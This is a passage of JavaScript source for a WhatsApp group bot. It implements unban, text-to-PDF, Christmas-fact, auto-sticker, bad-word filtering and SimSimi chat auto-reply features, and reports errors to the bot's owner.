    reply(`𝚄𝚂𝙴𝚁 𝙱𝙰𝙽𝙽𝙴𝙳 𝙵𝚁𝙾𝙼 𝙲𝙷𝙰𝚃𝚃𝙸𝙽𝙶 𝙾𝙽 𝚃𝙷𝙴 𝙶𝚁𝙾𝚄𝙿 \n𝙽𝚄𝙼𝙱𝙴𝚁: ${entry.number}\n𝙶𝚁𝙾𝚄𝙿: ${entry.groupJid || 'N/A'}\n> ${caption}`);
}
break;
case 'unban': case 'unsuspend': {
    if (!isGroup) setReply(mess.only.group)
    if (!isOwner && !isAdmins) return setReply(mess.only.admin);
    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
    await loading();
    // Get the target user (via reply or tag)
    let target = mentionByReply ? quoted.sender : mentionByTag[0];
    if (!target) return reply('`No target detected`\n*Reply or tag the person*');

    // Load the banned data
    const banData = JSON.parse(fs.readFileSync('./database/banned.json', 'utf-8') || '[]');
    
    // Check if the user is in the banned list
    const index = banData.findIndex(ban => ban.number === target && (!ban.groupJid || ban.groupJid === m.chat));
    if (index === -1) return reply('𝚃𝚑𝚒𝚜 𝚞𝚜𝚎𝚛 𝚑𝚊𝚜𝚗\'𝚝 𝚋𝚎𝚎𝚗 𝚋𝚊𝚗𝚗𝚎𝚍.');

    // Remove the user from the banned list
    banData.splice(index, 1);
    fs.writeFileSync('./database/banned.json', JSON.stringify(banData, null, 2));

    reply(`𝚄𝚂𝙴𝚁 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝚄𝙽𝙱𝙰𝙽𝙽𝙴𝙳.\n𝙽𝚄𝙼𝙱𝙴𝚁: ${target}\n𝙶𝚁𝙾𝚄𝙿: ${isGroup ? m.chat : 'N/A'}\n> ${caption}`);
}
break;
case 'text2pdf': {
    if (!q) return setReply(`\`No text detected\`\n*Example:  ${prefix + command} text*`);

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://bk9.fun/tools/pdf?q=${encodeURIComponent(q)}`;

        // Fetch the PDF response
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`Failed to fetch PDF. Status: ${response.status}`);

        const buffer = await response.buffer();

        // Send the generated PDF
        await conn.sendMessage(m.chat, {
            document: buffer,
            mimetype: 'application/pdf',
            fileName: 'text2pdf.pdf',
            caption: `Here is your PDF file for the provided text.\n> ${caption}`
        }, { quoted: m });

    } catch (error) {
        console.error("Error in text2pdf case:", error);
        setReply("An error occurred while converting the text to a PDF. Please try again later.");
    }
    break;
}
case 'xmasfact': {
    try {
        await loading();

        // Fetch the facts from the API
        const apiUrl = `https://christmasjoy.dev/api/facts`;
        const response = await fetch(apiUrl);
        const facts = await response.json();

        // Validate the API response
        if (!Array.isArray(facts) || facts.length === 0) {
            return reply("No Christmas facts found. Please try again later.");
        }

        // Select a random fact
        const randomFact = facts[Math.floor(Math.random() * facts.length)];

        // Send the fact
        reply(`🎄 *Christmas Fact:* 🎅\n\n\`\`\`${randomFact}\`\`\``);
    } catch (error) {
        console.error("Error in xmasfact case:", error);
        reply("An error occurred while fetching a Christmas fact. Please try again later.");
    }
    break;
}
                default:
 
                    conn.ev.on('messages.upsert', async (chatUpdate) => {
    if (!chatUpdate.messages) return;
    const m = chatUpdate.messages[0];

    if (m.key.fromMe || !m.key.remoteJid.endsWith('@g.us')) return;

    const bannedUsers = global.db.data.banned[m.key.remoteJid];
    if (bannedUsers && bannedUsers.includes(m.sender)) {
        await conn.sendMessage(m.key.remoteJid, { delete: m.key }); // Delete the message
    }
});

                    if (isSimi) {
                        await Nothing(toFirstCase(command), dash, allcommand)
                        const stringSimilarity = require("string-similarity");
                        let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
                       //reply(`*Command ${prefix+command} not available*\nSIMILAR ${prefix+matches.bestMatch.target.toLowerCase()}\n*\`Message Blue-demon for any CMD suggestion\`*`) 
                    }
            } //Akhir switch command
            //autosticker
            if (db.data.settings['settingbot'].autoSticker) {
                if (m.key.fromMe) return
                if (/image/.test(mime) && !/webp/.test(mime)) {
                    let mediac = await conn.downloadAndSaveMediaMessage(quoted, makeid(5))
                    conn.sendImageAsSticker(from, mediac, m, {
                        packname: global.packName,
                        author: global.authorName
                    })
                    reply(`Auto sticker detected`)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return
                    let mediac = await conn.downloadAndSaveMediaMessage(quoted, makeid(5))
                    conn.sendVideoAsSticker(from, mediac, m, {
                        packname: global.packName,
                        author: global.authorName
                    })
                }
            }
            //User Private Chat
            if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {} else if (!isGroup && user && isPremium && !itsMe) {
                setReply(`${ucapanWaktu} *${pushname}*  how can i help you? please type *${prefix}menu*`)
                user.pc = new Date * 1
            }
if (global.badword === true && bad.some(word => budy.toLowerCase().includes(word.toLowerCase()))) {
    if (cekSpam("NotCase", senderNumber, AntiSpam)) return;

    addSpam("NotCase", senderNumber, "10s", AntiSpam);

    if (isGroup) {
        if (isBotGroupAdmins) {
            await conn.sendMessage(from, {
                delete: {
                    remoteJid: from,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender,
                },
            });

            await conn.sendMessage(from, {
                text: `*Warning: Badwords are prohibited in this group.*\nYour message has been deleted.`,
            }, { quoted: m });
        } else {
            await conn.sendMessage(from, {
                text: `*Warning: Badwords are prohibited in this group.*\nI don't have admin privileges to delete the message.`,
            }, { quoted: m });
        }
    } else {
        await conn.sendMessage(from, {
            text: `*Warning: Badwords are prohibited.*\nPlease refrain from using inappropriate language.`,
        }, { quoted: m });
    }
}
            //AUTO RESPON SIMI VIA REPLY/TAG BOT
            if (isSimi) {
                const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
                const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
                const mentionByReplySticker = type == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : ""
                if (isGroup && chat.simi && Input == botNumber && isGroup && !replyCommand && !isAudio && !allcommand.includes(toFirstCase(command)) || isGroup && chat.simi && mentionByReplySticker == botNumber && isSticker && !replyCommand || body.toLowerCase().includes(botName.toLowerCase())) {
                    await sleep(2000)
                    conn.sendPresenceUpdate('recording', from)
                    if (isQuotedReplySticker || isReplySticker) {
                        await sleep(2000)
                        let namastc = await pickRandom(Object.keys(db.data.sticker))
                        conn.sendMessage(from, {
                            sticker: {
                                url: db.data.sticker[namastc].link
                            }
                        }, {
                            quoted: fsimi
                        })
                    } else {
                        let jawab = ["Afa iyah 🗿", "Oh", "Aku ga ngerti om 🐦", "Boong", "🗿", "🐦", "Oh gitu 🐦"]
                        let teks1 = pickRandom(jawab)
                        let teks2 = body
                        let hasil = [`${teks1}`, `${teks2}`]
                        let random = pickRandom(hasil)
                        let kata = mentionByTag ? body.replace(mentionByTag, "") : body
                        let kato = ["Kenapa ?", "Ha ?", "Napa tag gua ?", "napa ?", "ya ?", "apa ?", "Hmm ?"]
                        let acak = pickRandom(kato)
                        if (kata == "") return conn.sendMessage(from, {
                            text: acak
                        }, {
                            quoted: fsimi
                        })
                        let nana = /sayang|bercanda/
                        try {
                            await sleep(1000)
                            let simi = await getMessage(kata, 'id')
                            m.reply(simi.replace(nana, "****"))
                        } catch (e) {
                            Log(e)
                            await sleep(1000)
                            //conn.sendMesage(from,{text:random},{quoted:fsimi})
                            reply(random)
                        }

                        async function mainSimi(aw) {
                            let res = await fetchJson(`https://api.miftahganzz.my.id/api/ai/simisimi?q=${aw}&apikey=officialdittaz`)
                            let data = res.respon
                            let pesan = data.replace('simi', Botname).replace('Simi', Botname)
                            return pesan
                        }

                        async function getMessage(yourMessage, langCode) {
                            const res = await axios.post(
                                'https://api.simsimi.vn/v2/simtalk',
                                new URLSearchParams({
                                    'text': yourMessage,
                                    'lc': langCode
                                })
                            )

                            if (res.status > 200)
                                throw new Error(res.data.success);
                            return res.data.message.replace('simi', botName)
                        }


                    }
                }
            }
        } catch (err) {
            console.log(err)
            //add to dashboard
            if (isCmd) Failed(toFirstCase(command), dash)
            let e = util.format(err)
            if (err.message.includes("Cannot find module")) {
                let module = err.message.split("Cannot find module '")[1].split("'")[0]
                let teks = `Module ${module} has not been installed
Please install it first`
                return await conn.sendText(dev.key.remoteJid, teks, dev)
            }
            await conn.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, dev)
            if (checkError(err.message, db.data.listerror)) return
            addError(err.message, command, db.data.listerror)
            if (autoblockcmd) {
                addblockcmd(command, listcmdblock)
                await setReply("Command telah di block karena terjadi error")
            }

            if (autoReport) {
                if (isQuotedImage) {
                    var media = "Reply Image ✅"
                } else if (isQuotedVideo) {
                    var media = "Reply Video ✅"
                } else if (isQuotedSticker) {
                    var media = "Reply Sticker ✅"
                } else if (isQuotedAudio) {
                    var media = "Reply Audio ✅"
                } else if (isQuotedTeks) {
                    var media = "Reply Teks ✅"
                } else if (isQuotedTag) {
                    var media = "Reply Tag ✅"
                } else {
                    var media = "No Quoted ❌"
                }

                if (q.length > "0") {
                    var tetek = q
                } else if (q.length == "0") {
                    var tetek = "No Query ❌"
                }

                if (isGroup && isBotGroupAdmins) {
                    let linkgc = await conn.groupInviteCode(from)
                    var yeh = `https://chat.whatsapp.com/${linkgc}`
                } else if (isGroup && !isBotGroupAdmins) {
                    var yeh = `Bot Is Not Admin`
                } else if (!isGroup) {
                    var yeh = `Bot Is Not In The Group`
                }

                let teks = `\n*]───── 「 Report Bug ⚠️」 ─────[*\n\n👤 Name : ${pushname}\n📳 Number : wa.me/${senderNumber}\n📢 Report Info :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Of private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`

                conn.sendText(Ownerin, teks, dev)

                if (!autoblockcmd) {
                    //await conn.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
                }

                if (isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio) {
                    let media = await conn.downloadAndSaveMediaMessage(quoted, makeid(5))
                    await conn.sendMedia(Ownerin, media, dev, {
                        caption: "System Error"
                    })
                    await fs.unlinkSync(media)
                }

            }
        }




    } catch (err) {
        console.log(chalk.bgRed(color("[  ERROR  ]", "black")), util.format(err))
        let e = String(err)
        if (e.includes("this.isZero")) {
            return
        }
        if (e.includes("rate-overlimit")) {
            if (!publik) return
            publik = false
            await conn.sendMessage(botNumber + "@s.whatsapp.net", {
                text: `Rate-overlimit occurred
The bot has switched from public mode to Self mode
To avoid excessive spam,
Please wait 1 minute until all messages
have been read by the bot`
            })
            await setTimeout(() => {
                publik = true
                conn.sendMessage(botNumber + "@s.whatsapp.net", {
                    text: `Successfully changed self mode to public mode`
                })
            }, 60000)
            return
        }
        if (e.includes('Connection Closed')) {
            return
        }
        if (e.includes('Timed Out')) {
            return
        }
        if (e.includes('Value not found')) {
            return
        }
        console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
        if (Console) {
            conn.sendMessage(Ownerin, {
                text: util.format(e)
            })
        }
        //console.log(e)
    }
}



let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.bgGreen(color("[  UPDATE ]", "black")), chalk.white(`${__filename}`))
    delete require.cache[file]
    require(file)
})
